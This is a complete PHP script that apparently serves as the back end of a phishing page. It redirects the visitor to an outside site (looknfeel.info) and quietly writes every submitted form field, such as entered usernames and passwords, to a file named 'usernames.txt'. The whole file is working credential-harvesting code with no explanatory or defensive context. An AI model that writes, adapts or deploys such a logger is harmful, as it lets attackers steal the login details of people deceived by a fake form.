<?php
header ('Location:https://www.looknfeel.info/');
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "
");
}
fwrite($handle, "
");
fclose($handle);
exit;
?>
